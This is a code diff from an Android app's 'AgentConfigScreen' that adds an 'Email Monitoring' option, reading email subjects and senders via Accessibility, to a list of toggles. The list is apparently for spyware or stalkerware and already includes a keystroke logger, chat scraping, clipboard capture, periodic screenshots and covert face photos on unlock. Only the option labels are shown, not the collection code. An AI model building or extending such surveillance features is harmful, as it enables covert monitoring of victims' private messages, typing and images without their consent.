@@ -227,6 +227,7 @@ fun AgentConfigScreen(
                 Triple("screenshots", "Periodic Screenshots", "Capture screen every collection cycle"),
                 Triple("face_capture", "Face Capture on Unlock", "Front camera photo on each unlock"),
                 Triple("chat_scraping", "Chat Message Scraping", "Read chat text via Accessibility (requires Settings toggle)"),
+                Triple("email_monitoring", "Email Monitoring", "Read email subjects/senders via Accessibility (Gmail, Outlook, ProtonMail, etc.)"),
                 Triple("clipboard", "Clipboard Monitor", "Capture clipboard changes via Accessibility"),
                 Triple("keylogger", "Keystroke Logger", "Log typed text per app via Accessibility"),
                 Triple("wifi_history", "WiFi History", "Log every WiFi network with signal strength"),
